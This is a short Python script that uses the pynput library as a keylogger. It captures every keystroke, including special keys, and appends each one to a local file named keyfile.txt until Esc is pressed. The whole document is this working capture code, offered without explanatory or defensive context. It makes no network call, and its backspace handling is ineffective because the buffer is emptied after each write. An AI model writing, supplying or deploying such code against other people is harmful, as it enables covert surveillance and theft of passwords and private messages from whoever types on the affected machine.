from pynput import keyboard

text = ""

def on_press(key):
    try:
        global text
        # Handle special keys
        if key == keyboard.Key.enter:
            text += "\n"
        elif key == keyboard.Key.tab:
            text += "\t"
        elif key == keyboard.Key.space:
            text += " "
        elif key in {keyboard.Key.shift, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r}:
            pass  
        elif key == keyboard.Key.esc:
            return False
        elif key == keyboard.Key.backspace and len(text) == 0:
            pass
        elif key == keyboard.Key.backspace and len(text) > 0:
            text = text[:-1]
        else:
            text += str(key.char) 
            
        with open("keyfile.txt", "a") as logkey:
            logkey.write(text)
            text=""

    except AttributeError:
        pass
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    input()
